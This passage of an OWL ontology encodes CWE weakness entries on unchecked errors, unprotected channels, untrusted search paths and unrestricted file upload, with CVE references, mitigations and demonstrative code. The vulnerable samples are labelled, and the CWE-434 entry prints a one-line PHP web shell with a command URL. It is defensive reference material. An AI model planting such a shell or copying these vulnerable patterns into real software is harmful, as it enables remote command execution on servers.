     Annotations: rdfs:comment "Subject the software to extensive testing to discover some of the possible instances of where/how errors or return values are not handled. Consider testing techniques such as ad hoc, equivalence partitioning, robustness and fault tolerance, mutation, and fuzzing."^^xsd:string
                 
                 testing  ""^^xsd:string
    
    
Individual: CWE-391_Unchecked_Error_Condition

    Annotations: 
        rdfs:comment "Ignoring exceptions and other error conditions may allow an attacker to induce unexpected behavior unnoticed."^^xsd:string,
        rdfs:comment "Maintenance:
This entry is slated for deprecation; it has multiple widespread interpretations by CWE analysts. It currently combines information from three different taxonomies, but each taxonomy is talking about a slightly different issue. CWE analysts might map to this entry based on any of these issues. 7PK has \"Empty Catch Block\" which has an association with empty exception block (CWE-1069); in this case, the exception has performed the check, but does not handle. In PLOVER there is \"Unchecked Return Value\" which is CWE-252, but unlike \"Empty Catch Block\" there isn't even a check of the issue - and \"Unchecked Error Condition\" implies lack of a check. For CLASP, \"Uncaught Exception\" (CWE-248) is associated with incorrect error propagation - uncovered in CWE 3.2 and earlier, at least. There are other issues related to error handling and checks."^^xsd:string,
        rdfs:comment "Other:

When a programmer ignores an exception, they implicitly state that they are operating under one of two assumptions:
 - This method call can never fail.
 - It doesn't matter if this call fails."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     ID  "391"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code excerpt ignores a rarely-thrown exception from doExchange().

(bad code)
Example Language: Java 
try {
doExchange();
}
catch (RareException e) {

// this can never happen
}
If a RareException were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Catch all relevant exceptions. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Alter Execution Logic"^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     integrity  "Varies by Context"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Alter Execution Logic"^^xsd:string,
     other  "Unexpected State"^^xsd:string,
     other  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "A language can be used which requires, at compile time, to catch all serious exceptions. However, one must make sure to use the most current version of the API as new exceptions could be added."^^xsd:string, 
                 rdfs:comment "The choice between a language which has named or unnamed exceptions needs to be done. While unnamed exceptions exacerbate the chance of not properly dealing with an exception, named exceptions suffer from the up call version of the weak base class problem."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-392_Missing_Report_of_Error_Condition

    Annotations: 
        rdfs:comment "The software encounters an error but does not provide a status code or return value to indicate that an error has occurred."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1012_Cross_Cutting,
     
     Annotations: rdfs:comment "Kernel function truncates long pathnames without generating an error, leading to operation on wrong directory."^^xsd:string
                 
                 references  CVE-2002-0499,
     
     Annotations: rdfs:comment "Error checking routine in PKCS#11 library returns \"OK\" status even when invalid signature is detected, allowing spoofed messages."^^xsd:string
                 
                 references  CVE-2002-1446,
     
     Annotations: rdfs:comment "Function returns \"OK\" even if another function returns a different status code than expected, leading to accepting an invalid PIN number."^^xsd:string
                 
                 references  CVE-2004-0063,
     
     Annotations: rdfs:comment "Function returns non-error value when a particular erroneous condition is encountered, leading to resultant NULL dereference."^^xsd:string
                 
                 references  CVE-2005-2459,
     ID  "392"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "In the following snippet from a doPost() servlet method, the server returns \"200 OK\" (default) even if an error occurs.

(bad code)
Example Language: Java 
try {

// Something that may throw an exception. 
...
} catch (Throwable t) {
logger.error(\"Caught: \" + t.toString());
return;
}"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Errors that are not properly reported could place the system in an unexpected state that could lead to unintended behaviors."^^xsd:string
                 
                 integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "Errors that are not properly reported could place the system in an unexpected state that could lead to unintended behaviors."^^xsd:string
                 
                 integrity  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Errors that are not properly reported could place the system in an unexpected state that could lead to unintended behaviors."^^xsd:string
                 
                 other  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "Errors that are not properly reported could place the system in an unexpected state that could lead to unintended behaviors."^^xsd:string
                 
                 other  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "where the weakness exists independent of other weaknesse"^^xsd:string
                 
                 weakness_ordinalities  "Primary"^^xsd:string,
     
     Annotations: rdfs:comment "where the weakness is typically related to the presence of some other weaknesses"^^xsd:string
                 
                 weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-419_Unprotected_Primary_Channel

    Annotations: 
        rdfs:comment "The software uses a primary channel for administration or restricted functionality, but it does not properly protect the channel."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Harvesting Information via API Event Monitoring"^^xsd:string
                 
                 related_attack_patterns  CAPEC-383,
     ID  "419"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not expose administrative functionnality on the user UI."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Protect the administrative/restricted functionality with a strong authentication mechanism."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-420_Unprotected_Alternate_Channel

    Annotations: 
        rdfs:comment "Relationship
This can be primary to authentication errors, and resultant from unhandled error conditions."^^xsd:string,
        rdfs:comment "The software protects a primary channel, but it does not use the same level of protection for an alternate channel."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Windows named pipe created without authentication/access control, allowing configuration modification."^^xsd:string
                 
                 references  CVE-2002-0066,
     
     Annotations: rdfs:comment "DB server assumes that local clients have performed authentication, allowing attacker to directly connect to a process to load libraries and execute commands; a socket interface also exists (another alternate channel), so attack can be remote."^^xsd:string
                 
                 references  CVE-2002-0567,
     
     Annotations: rdfs:comment "Product does not restrict access to underlying database, so attacker can bypass restrictions by directly querying the database."^^xsd:string
                 
                 references  CVE-2002-1578,
     
     Annotations: rdfs:comment "FTP service can not be disabled even when other access controls would require it."^^xsd:string
                 
                 references  CVE-2002-1863,
     
     Annotations: rdfs:comment "User can avoid lockouts by using an API instead of the GUI to conduct brute force password guessing."^^xsd:string
                 
                 references  CVE-2003-1035,
     
     Annotations: rdfs:comment "Router management interface spawns a separate TCP connection after authentication, allowing hijacking by attacker coming from the same IP address."^^xsd:string
                 
                 references  CVE-2004-1461,
     ID  "420"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Identify all alternate channels and use the same protection mechanisms that are used for the primary channels."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string
    
    
Individual: CWE-426_Untrusted_Search_Path

    Annotations: 
        rdfs:comment "Affected Resources: 
- System Process"^^xsd:string,
        rdfs:comment "Alternate Terms
Untrusted Path"^^xsd:string,
        rdfs:comment "Functional Areas:
- Program Invocation
- Code Libraries"^^xsd:string,
        rdfs:comment "Research Gap:
Search path issues on Windows are under-studied and possibly under-reported."^^xsd:string,
        rdfs:comment "The application searches for critical resources using an externally-supplied search path that can point to resources that are not under the application's direct control."^^xsd:string,
        rdfs:comment "This might allow attackers to execute their own programs, access unauthorized data files, or modify configuration in unexpected ways. If the application uses a search path to locate critical resources such as programs, then an attacker could modify that search path to point to a malicious program, which the targeted application would then execute. The problem extends to any type of critical resource that the application trusts.

Some of the most common variants of untrusted search path are:
- In various UNIX and Linux-based systems, the PATH environment variable may be consulted to locate executable programs, and LD_PRELOAD may be used to locate a separate library.
- In various Microsoft-based systems, the PATH environment variable is consulted to locate a DLL, if the DLL is not found in other paths that appear earlier in the search order."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Application relies on its PATH environment variable to find and execute program."^^xsd:string
                 
                 references  CVE-1999-1120,
     
     Annotations: rdfs:comment "Chain: untrusted search path enabling resultant format string by loading malicious internationalization messages."^^xsd:string
                 
                 references  CVE-2007-2027,
     
     Annotations: rdfs:comment "Server allows client to specify the search path, which can be modified to point to a program that the client has uploaded."^^xsd:string
                 
                 references  CVE-2008-1319,
     
     Annotations: rdfs:comment "Database application relies on its PATH environment variable to find and execute program."^^xsd:string
                 
                 references  CVE-2008-1810,
     
     Annotations: rdfs:comment "setuid program allows compromise using path that finds and loads a malicious library."^^xsd:string
                 
                 references  CVE-2008-2613,
     
     Annotations: rdfs:comment "Untrusted search path using malicious .EXE in Windows environment."^^xsd:string
                 
                 references  CVE-2008-3485,
     
     Annotations: rdfs:comment "Redirect Access to Libraries"^^xsd:string
                 
                 related_attack_patterns  CAPEC-159,
     
     Annotations: rdfs:comment "Leveraging/Manipulating Configuration File Search Paths"^^xsd:string
                 
                 related_attack_patterns  CAPEC-38,
     ID  "426"^^xsd:positiveInteger,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Attack Surface Reduction
Hard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such as CWE-426 and CWE-428."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string, 
                 rdfs:comment "The program could be redirected to the wrong files, potentially triggering a crash or hang when the targeted file is too large or does not have the expected format."^^xsd:string, 
                 rdfs:comment "The program could send the output of unauthorized files to the attacker."^^xsd:string, 
                 rdfs:comment "There is the potential for arbitrary code execution with privileges of the vulnerable program."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system.

(bad code)
Example Language: C 
#define DIR \"/restricted/directory\"

char cmd[500];
sprintf(cmd, \"ls -l %480s\", DIR);
/* Raise privileges to those needed for accessing DIR. */ 

RaisePrivileges(...);
system(cmd);
DropPrivileges(...);
...
This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.

However, because the program does not modify the PATH environment variable, the following attack would work:

(attack code)
 The user sets the PATH to reference a directory under the attacker's control, such as \"/my/dir/\".
The attacker creates a malicious program called \"ls\", and puts that program in /my/dir
The user executes the program.
When system() is executed, the shell consults the PATH to find the ls program
The program finds the attacker's malicious program, \"/my/dir/ls\". It doesn't find \"/bin/ls\" because PATH does not contain \"/bin/\".
The program executes the attacker's malicious program with the raised privileges."^^xsd:string, 
                 rdfs:comment "Example 2
This code prints all of the running processes belonging to the current user.

(bad code)
Example Language: PHP 

//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (CWE-78) 
$userName = getCurrentUser();
$command = 'ps aux | grep ' . $userName;
system($command);
This program is also vulnerable to a PATH based attack, as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users."^^xsd:string, 
                 rdfs:comment "Example 3
The following code is from a web application that allows users access to an interface through which they can update their password on the system. In this environment, user passwords can be managed using the Network Information System (NIS), which is commonly used on UNIX systems. When performing NIS updates, part of the process for updating passwords is to run a make command in the /var/yp directory. Performing NIS updates requires extra privileges.

(bad code)
Example Language: Java 
...
System.Runtime.getRuntime().exec(\"make\");
...
The problem here is that the program does not specify an absolute path for make and does not clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
Attach the monitor to the process and look for library functions and system calls that suggest when a search path is being used. One pattern is when the program performs multiple accesses of the same file but in different directories, with repeated failures until the proper filename is found. Library calls such as getenv() or their equivalent can be checked to see if any path-related variables are being accessed."^^xsd:string
                 
                 dynamic  "black box"^^xsd:string,
     
     Annotations: rdfs:comment "Check your search path before use and remove any elements that are likely to be unsafe, such as the current working directory or a temporary files directory."^^xsd:string, 
                 rdfs:comment "Remove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction
Hard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such as CWE-426 and CWE-428."^^xsd:string, 
                 rdfs:comment "Use other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of it, while execl() and execv() require a full path."^^xsd:string, 
                 rdfs:comment "When invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-434_Unrestricted_Upload_of_File_with_Dangerous_Type

    Annotations: 
        rdfs:comment "Affected Resources:
File or Directory"^^xsd:string,
        rdfs:comment "Alternate Terms:
Unrestricted File Upload:	
The \"unrestricted file upload\" term is used in vulnerability databases and elsewhere, but it is insufficiently precise. The phrase could be interpreted as the lack of restrictions on the size or number of uploaded files, which is a resource consumption issue."^^xsd:string,
        rdfs:comment "Functional Areas:
File Processing"^^xsd:string,
        rdfs:comment "Relationship:
- This can have a chaining relationship with incomplete blacklist / permissive whitelist errors when the product tries, but fails, to properly limit which types of files are allowed (CWE-183, CWE-184).
- This can also overlap multiple interpretation errors for intermediaries, e.g. anti-virus products that do not remove or quarantine attachments with certain file extensions that can be processed by client systems."^^xsd:string,
        rdfs:comment "Research Gap:
PHP applications are most targeted, but this likely applies to other languages that support file upload, as well as non-web technologies. ASP applications have also demonstrated this problem."^^xsd:string,
        rdfs:comment "The software allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Web-based mail product stores \".shtml\" attachments that could contain SSI"^^xsd:string
                 
                 references  CVE-2001-0901,
     
     Annotations: rdfs:comment "PHP upload does not restrict file types"^^xsd:string
                 
                 references  CVE-2002-1841,
     
     Annotations: rdfs:comment "improper type checking of uploaded files"^^xsd:string
                 
                 references  CVE-2004-2262,
     
     Annotations: rdfs:comment "program does not restrict file types"^^xsd:string
                 
                 references  CVE-2005-0254,
     
     Annotations: rdfs:comment "upload and execution of .php file"^^xsd:string
                 
                 references  CVE-2005-1868,
     
     Annotations: rdfs:comment "upload file with dangerous extension"^^xsd:string
                 
                 references  CVE-2005-1881,
     
     Annotations: rdfs:comment "ASP file upload"^^xsd:string
                 
                 references  CVE-2005-3288,
     
     Annotations: rdfs:comment "ASP file upload"^^xsd:string
                 
                 references  CVE-2006-2428,
     
     Annotations: rdfs:comment "Double \"php\" extension leaves an active php extension in the generated filename."^^xsd:string
                 
                 references  CVE-2006-4558,
     
     Annotations: rdfs:comment "ASP program allows upload of .asp files by bypassing client-side checks"^^xsd:string
                 
                 references  CVE-2006-6994,
     
     Annotations: rdfs:comment "Accessing Functionality Not Properly Constrained by ACLs"^^xsd:string
                 
                 related_attack_patterns  CAPEC-1,
     
     Annotations: rdfs:comment "Privilege Abuse"^^xsd:string
                 
                 related_attack_patterns  CAPEC-122,
     ID  "434"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Consider storing the uploaded files outside of the web document root entirely. Then, use other mechanisms to deliver the files dynamically."^^xsd:string, 
                 rdfs:comment "Define a very limited set of allowable extensions and only generate filenames that end in these extensions. Consider the possibility of XSS (CWE-79) before allowing .html or .htm file types."^^xsd:string, 
                 rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "Generate a new, unique filename for an uploaded file instead of using the user-supplied filename, so that no external input is used at all."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Strategy: Enforcement by Conversion
When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail
Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "Arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. This is especially true for .asp and .php extensions uploaded to web servers because these file types are often treated as automatically executable, even when file system permissions do not specify execution. For example, in Unix environments, programs typically cannot run unless the execute bit is set, but PHP programs may be executed by the web server without directly invoking them on the operating system."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code intends to allow a user to upload a picture to the web server. The HTML code that drives the form on the user end has an input field of type \"file\".

Example Language: HTML  /* (good code) */
<form action=\"upload_picture.php\" method=\"post\" enctype=\"multipart/form-data\">

Choose a file to upload:
<input type=\"file\" name=\"filename\"/>
<br/>
<input type=\"submit\" name=\"submit\" value=\"Submit\"/>

</form>
Once submitted, the form above sends the file to upload_picture.php on the web server. PHP stores the file in a temporary location until it is retrieved (or discarded) by the server side code. In this example, the file is moved to a more permanent pictures/ directory.

Example Language: PHP  /* (bad code) */

// Define the target location where the picture being 

// uploaded is going to be saved. 
$target = \"pictures/\" . basename($_FILES['uploadedfile']['name']);

// Move the uploaded file to the new location. 
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))
{
echo \"The picture has been successfully uploaded.\";
}
else
{
echo \"There was an error uploading the picture, please try again.\";
}
The problem with the above code is that there is no check regarding type of file being uploaded. Assuming that pictures/ is available in the web document root, an attacker could upload a file with the name:

(attack code)
 malicious.php
Since this filename ends in \".php\" it can be executed by the web server. In the contents of this uploaded file, the attacker could use:

(attack code)
Example Language: PHP 
<?php
system($_GET['cmd']);

?>
Once this file has been installed, the attacker can enter arbitrary commands to execute using a URL such as:

(attack code)
 http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l
which runs the \"ls -l\" command - or any other type of command that the attacker wants to specify."^^xsd:string, 
                 rdfs:comment "Example 2
The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The HTML code is the same as in the previous example with the action attribute of the form sending the upload file request to the Java servlet instead of the PHP code.

Example Language: HTML   /* (good code) */
<form action=\"FileUploadServlet\" method=\"post\" enctype=\"multipart/form-data\">

Choose a file to upload:
<input type=\"file\" name=\"filename\"/>
<br/>
<input type=\"submit\" name=\"submit\" value=\"Submit\"/>

</form>
When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.

(bad code)
Example Language: Java 
public class FileUploadServlet extends HttpServlet {
...

protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
response.setContentType(\"text/html\");
PrintWriter out = response.getWriter();
String contentType = request.getContentType();

// the starting position of the boundary header
int ind = contentType.indexOf(\"boundary=\");
String boundary = contentType.substring(ind+9);

String pLine = new String();
String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value

// verify that content type is multipart form data
if (contentType != null && contentType.indexOf(\"multipart/form-data\") != -1) {
// extract the filename from the Http header
BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
...
pLine = br.readLine();
String filename = pLine.substring(pLine.lastIndexOf(\"\\\\\"), pLine.lastIndexOf(\"\\\"\"));
...

// output the file to the local upload directory
try {
BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
for (String line; (line=br.readLine())!=null; ) {
if (line.indexOf(boundary) == -1) {
bw.write(line);
bw.newLine();
bw.flush();
}
} //end of for loop
bw.close();


} catch (IOException ex) {...}
// output successful upload response HTML page
}
// output unsuccessful upload response HTML page
else
{...}
}
...
}
As with the previous example this code does not perform a check on the type of the file being uploaded. This could allow an attacker to upload any executable file or other file with malicious code.

Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-22, CWE-23). Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Web Application Scanner
- Web Services Scanner
- Database Scanners
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation"^^xsd:string
                 
